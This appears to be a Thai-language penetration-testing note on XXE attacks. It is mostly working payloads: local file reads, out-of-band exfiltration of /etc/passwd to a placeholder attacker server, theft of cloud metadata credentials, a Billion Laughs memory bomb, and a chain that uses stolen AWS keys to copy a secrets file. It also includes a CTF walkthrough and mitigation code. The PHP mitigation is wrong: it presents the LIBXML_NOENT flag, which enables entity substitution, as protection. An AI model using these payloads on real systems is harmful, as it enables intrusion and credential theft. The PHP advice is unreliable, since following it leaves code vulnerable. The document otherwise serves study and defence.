#web 
# XXE (XML External Entity)

> [!TIP] การตรวจสอบ XXE อย่างรวดเร็ว
> ลอง payload พื้นฐาน: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` หรือใช้ [[Burp Suite]] Collaborator เพื่อทดสอบ out-of-band XXE

## ❓ What
XXE (XML External Entity) เป็นช่องโหว่ที่เกิดจากการ parse XML input ที่ไม่ปลอดภัย ช่วยให้ผู้โจมตีสามารถอ่านไฟล์ local บน server, ทำ SSRF (Server-Side Request Forgery), หรือ DOS (Denial of Service) ได้ โดยการแทรก external entity definition เข้าไปใน XML payload

**XML Structure พื้นฐาน:**
```xml
<!-- XML Document ประกอบด้วย -->
<?xml version="1.0" encoding="UTF-8"?>  <!-- XML Declaration -->
<!DOCTYPE root [                        <!-- Document Type Definition (DTD) -->
  <!ENTITY entity_name "value">         <!-- Entity Definition -->
]>
<root>                                  <!-- Root Element -->
  <data>&entity_name;</data>            <!-- Entity Reference -->
</root>
```

**Entity Types:**
- **Internal Entity** - ค่าที่ define ใน DTD โดยตรง
- **External Entity** - ค่าที่อ้างอิงจาก URL หรือ file path ภายนอก
- **Parameter Entity** - Entity ที่ใช้ภายใน DTD เท่านั้น (ใช้ `%` แทน `&`)

**เทคนิคที่เกี่ยวข้อง:** [[SSRF (Server-Side Request Forgery)]], [[🌐 Web application]], [[File Upload]]

## 🔍 Landmark (Detection)

### การตรวจหาช่องโหว่ XXE
1. **Content-Type Detection** - ตรวจสอบว่า application รับ XML input หรือไม่
   - `Content-Type: application/xml`
   - `Content-Type: text/xml`
   - API endpoints ที่รับ XML (SOAP, REST with XML)

2. **XML Parser Detection** - ทดสอบว่า server parse XML หรือไม่
   ```xml
   <!-- ส่ง simple XML เพื่อดูว่า server response -->
   <?xml version="1.0"?>
   <root>
     <test>value</test>
   </root>
   ```

3. **Entity Processing Detection** - ทดสอบว่า parser ประมวลผล entity หรือไม่
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE root [<!ENTITY test "XXE_WORKS">]>
   <root>
     <data>&test;</data>
   </root>
   ```

4. **External Entity Detection** - ทดสอบว่า parser อนุญาต external entity หรือไม่
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <root>
     <data>&xxe;</data>
   </root>
   ```

> [!WARNING] XML Endpoints ที่มักมีช่องโหว่
> - SOAP Web Services
> - REST APIs ที่รับ XML
> - RSS/Atom Feeds
> - SVG File Upload
> - SAML Authentication
> - Office document uploads (DOCX, XLSX, PPTX)

## 🟦 Types of XXE

### 1. Classic XXE (In-band)
XXE แบบธรรมดาที่เห็น output ของ external entity บนหน้า response ทันที สามารถอ่านไฟล์และเห็นเนื้อหาได้โดยตรง

### 2. Blind XXE (Out-of-Band)
ไม่มี output แสดงบนหน้า response แต่สามารถตรวจสอบได้ด้วยการส่ง request ไปยัง external server ที่ผู้โจมตีควบคุม (OOB - Out-of-Band)

### 3. Error-Based XXE
ใช้ error message ที่แสดงออกมาเพื่อดึงข้อมูลจากไฟล์ โดยการทำให้ parser เกิด error แบบมีเงื่อนไข

### 4. SSRF via XXE
ใช้ XXE เพื่อทำ Server-Side Request Forgery โดยให้ server request ไปยัง internal network หรือ external services

### 5. DOS via XXE
ใช้ XXE เพื่อทำ Denial of Service โดย Billion Laughs Attack หรือ External Entity recursion

## 🔨 Exploitation

### Classic XXE - File Disclosure

**Basic File Reading:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

**Reading with PHP Wrapper:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
  <data>&xxe;</data>
</root>
```
**หมายเหตุ:** ใช้ base64 encode เพื่อหลีกเลี่ยงปัญหา special characters ใน PHP code

**Reading Windows Files:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>
  <data>&xxe;</data>
</root>
```

**Multiple Files via Parameter Entity:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://<attacker_server>/evil.dtd">
  %dtd;
  %all;
]>
<root>
  <data>&send;</data>
</root>
```

**evil.dtd on attacker server:**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'file:///%file;'>">
```

### Blind XXE - Out-of-Band (OOB)

**Basic OOB Detection:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://<attacker_server>/xxe_test">
]>
<root>
  <data>&xxe;</data>
</root>
```
**หมายเหตุ:** ตรวจสอบ access log ที่ attacker server เพื่อยืนยันว่ามี XXE

**OOB Data Exfiltration:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://<attacker_server>/evil.dtd">
  %dtd;
  %send;
]>
<root><data>test</data></root>
```

**evil.dtd (Data Exfiltration):**
```xml
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://<attacker_server>/?data=%file;'>">
%all;
```
**หมายเหตุ:** ใช้ `&#x25;` เพื่อ encode `%` character ใน nested parameter entity

### Error-Based XXE

**Using Non-existent File:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; fail SYSTEM 'file:///%file;/non_existent'>">
  %error;
  %fail;
]>
<root></root>
```
**หมายเหตุ:** Error message จะแสดงเนื้อหาของ /etc/passwd

**Using Invalid Protocol:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x26;#x25; exfil SYSTEM 'ftp://invalid/%file;'>">
  %eval;
  %exfil;
]>
<root></root>
```

### SSRF via XXE

**Internal Network Scan:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:80/">
]>
<root>
  <data>&xxe;</data>
</root>
```

**AWS Metadata Access:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>
  <data>&xxe;</data>
</root>
```
**หมายเหตุ:** สามารถ escalate เป็น AWS account compromise ได้

**Azure Metadata Access:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
]>
<root>
  <data>&xxe;</data>
</root>
```

**GCP Metadata Access:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
]>
<root>
  <data>&xxe;</data>
</root>
```

> [!TIP] Cloud Metadata Exploitation
> เมื่อได้ credentials จาก metadata แล้ว สามารถใช้ AWS CLI, Azure CLI, หรือ gcloud เพื่อ escalate privileges ต่อได้

### DOS via XXE

**Billion Laughs Attack (XML Bomb):**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
]>
<root>&lol6;</root>
```
**หมายเหตุ:** Entity นี้จะ expand แบบ exponential ทำให้ memory หมด

**External Entity Recursion:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % a SYSTEM "file:///dev/random">
  %a;
]>
<root></root>
```

## 🚪 Advanced Techniques

### SVG File XXE

**Malicious SVG Upload:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20" font-size="16">&xxe;</text>
</svg>
```
**หมายเหตุ:** อัปโหลดเป็น SVG แล้วดูที่ rendered image หรือ metadata

### XInclude XXE

**สำหรับกรณีที่ไม่สามารถแก้ไข DOCTYPE ได้:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
**หมายเหตุ:** ใช้เมื่อ XML มาจาก concatenation หรือ embedded XML

### UTF-7 Encoding Bypass

**Bypass WAF with UTF-7:**
```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE foo+AFs-+ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
<foo>&xxe;</foo>
```

## 🛡️ Modern Mitigations

### Application Level

**1. Disable External Entities (Recommended):**

**PHP (libxml):**
```php
<?php
// ปิด external entity loading
libxml_disable_entity_loader(true);

// หรือใช้ LIBXML_NOENT flag
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
?>
```

**Java (DocumentBuilderFactory):**
```java
// ปิด DTD processing ทั้งหมด (วิธีที่ปลอดภัยที่สุด)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

**Python (defusedxml):**
```python
# ใช้ defusedxml แทน xml.etree
from defusedxml.ElementTree import parse

# การใช้งาน
tree = parse('data.xml')
root = tree.getroot()

# หรือใช้ lxml แบบปลอดภัย
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
doc = etree.parse('data.xml', parser)
```

**.NET (XmlReader):**
```csharp
// ปิด DTD processing
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;

XmlReader reader = XmlReader.Create(stream, settings);
```

**2. Input Validation:**
```php
<?php
// ตรวจสอบว่ามี DOCTYPE หรือ ENTITY ใน input หรือไม่
if (preg_match('/<!DOCTYPE|<!ENTITY|SYSTEM|PUBLIC/i', $xml)) {
    die('Malicious XML detected');
}
?>
```

**3. Use JSON Instead:**
- ใช้ JSON แทน XML เมื่อเป็นไปได้
- JSON ไม่มีแนวคิดของ external entities
- ลด attack surface ได้มาก

> [!WARNING] Configuration Mistakes
> - อย่าใช้แค่ `libxml_disable_entity_loader(true)` อย่างเดียวใน PHP 8.0+
> - PHP 8.0+ deprecate ฟังก์ชันนี้และไม่มีผลอีกต่อไป
> - ต้องใช้ `LIBXML_NOENT` flag ร่วมด้วย

### Infrastructure Level

**1. Network Segmentation:**
- แยก application server ออกจาก sensitive internal networks
- ใช้ firewall rules เพื่อจำกัด outbound connections
- Block access ไปยัง cloud metadata endpoints (169.254.169.254)

**2. WAF Rules:**
```nginx
# ModSecurity Rule Example
SecRule REQUEST_BODY "@rx (?i)<!DOCTYPE.*\[.*<!ENTITY" \
    "id:1234,phase:2,deny,status:403,msg:'XXE Attack Detected'"

SecRule REQUEST_BODY "@rx (?i)SYSTEM\s+[\"'](?:file|http|ftp|php):" \
    "id:1235,phase:2,deny,status:403,msg:'External Entity Detected'"
```

## 🛠️ Tool

### Manual Testing

**Burp Suite XXE Scanner:**
- [[Burp Suite]] Professional มี active scanner สำหรับ XXE
- ใช้ Intruder เพื่อทดสอบ payloads หลายแบบ
- ใช้ Collaborator เพื่อตรวจจับ blind XXE

**XXEinjector:**
```bash
# Tool automation สำหรับ XXE testing
git clone https://github.com/enjoiz/XXEinjector.git

# Basic file extraction
./XXEinjector.rb --host=<target_ip> --port=80 --path=/upload \
  --file=/tmp/request.txt --enumeration

# OOB data exfiltration
./XXEinjector.rb --host=<target_ip> --port=80 --path=/upload \
  --file=/tmp/request.txt --oob=http --phpfilter
```

**OOB HTTP Server:**
```bash
# ใช้ Python SimpleHTTPServer สำหรับรับ OOB requests
python3 -m http.server 8000

# หรือใช้ netcat
nc -lvnp 8000

# ดู logs เพื่อยืนยัน XXE
```

## 💡 Related

เทคนิคที่เกี่ยวข้อง:
- [[SSRF (Server-Side Request Forgery)]] - XXE สามารถใช้ทำ SSRF ได้
- [[🌐 Web application]] - ความรู้พื้นฐาน web security
- [[File Upload]] - XXE ใน SVG/Office documents
- [[SQL Injection]] - อาจใช้ร่วมกับ XXE
- [[Command Injection]] - escalate จาก file read ไป RCE

Tools:
- [[Burp Suite]] - XXE detection และ exploitation
- **XXEinjector** - automated XXE tool
- **xmllint** - validate XML structure

## 📚 Example

### CTF Walkthrough: HackTheBox - "Markup"

**ภาพรวม Challenge:**
- Web application ที่รับ XML input สำหรับ order submission
- มีช่องโหว่ XXE ใน XML parser
- เป้าหมาย: อ่านไฟล์ flag.txt ผ่าน XXE

**Step 1: Reconnaissance**
```bash
# เข้าเว็บและสังเกต order form
# Intercept ด้วย Burp Suite
POST /order HTTP/1.1
Host: <target_ip>
Content-Type: application/xml

<?xml version="1.0"?>
<order>
  <item>Product A</item>
  <quantity>1</quantity>
</order>
```

**Step 2: Test Basic XXE**
```xml
<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY test "XXE_TEST">
]>
<order>
  <item>&test;</item>
  <quantity>1</quantity>
</order>
```
**Result:** เห็น "XXE_TEST" แสดงบนหน้าเว็บ → XXE vulnerability confirmed

**Step 3: File Disclosure**
```xml
<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<order>
  <item>&xxe;</item>
  <quantity>1</quantity>
</order>
```
**Result:** เห็นเนื้อหา /etc/passwd → file reading works

**Step 4: Find Flag**
```xml
<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///var/www/html/flag.txt">
]>
<order>
  <item>&xxe;</item>
  <quantity>1</quantity>
</order>
```
**Result:** `HTB{xxe_1s_v3ry_d4ng3r0us}`

**Step 5: Alternative - PHP Wrapper**
```xml
<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<order>
  <item>&xxe;</item>
  <quantity>1</quantity>
</order>
```
**Result:** Base64-encoded source code → decode เพื่ออ่าน PHP code

**Decode:**
```bash
echo "PD9waHAg..." | base64 -d
```

> [!TIP] Key Takeaways
> - ทดสอบ internal entity ก่อนเพื่อยืนยันว่า parser ประมวลผล entities
> - ใช้ php://filter เพื่ออ่าน source code ที่มี special characters
> - Common flag locations: `/flag.txt`, `/root/flag.txt`, `/var/www/flag.txt`

### Real-World Example: SSRF via XXE to AWS

**Scenario:** Web application บน AWS EC2 ที่มี XXE vulnerability

**Step 1: Detect XXE**
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<data>&xxe;</data>
```

**Step 2: Test SSRF to Metadata**
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>
```
**Result:** List of available metadata paths

**Step 3: Get IAM Role Name**
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<data>&xxe;</data>
```
**Result:** `web-server-role`

**Step 4: Extract Credentials**
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/web-server-role">]>
<data>&xxe;</data>
```

**Result:**
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJal...",
  "Token": "IQoJ...",
  "Expiration": "2026-06-17T12:00:00Z"
}
```

**Step 5: Use Credentials**
```bash
# Configure AWS CLI
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="wJal..."
export AWS_SESSION_TOKEN="IQoJ..."

# List S3 buckets
aws s3 ls

# Access sensitive data
aws s3 cp s3://company-secrets/passwords.txt .
```

> [!WARNING] Cloud Security
> - XXE + SSRF บน cloud environments อันตรายมาก
> - สามารถ escalate เป็น full account compromise
> - ควร block access to metadata endpoints (169.254.169.254) ด้วย firewall

---

**สรุป Key Concepts:**
1. **Classic XXE** - อ่านไฟล์โดยตรงเมื่อเห็น output
2. **Blind XXE** - ใช้ OOB techniques เมื่อไม่มี direct output
3. **SSRF via XXE** - เข้าถึง internal networks และ cloud metadata
4. **Modern Defenses** - ปิด external entities และใช้ safe parsing libraries
5. **Attack Vectors** - XML endpoints, SVG uploads, Office documents, SOAP services

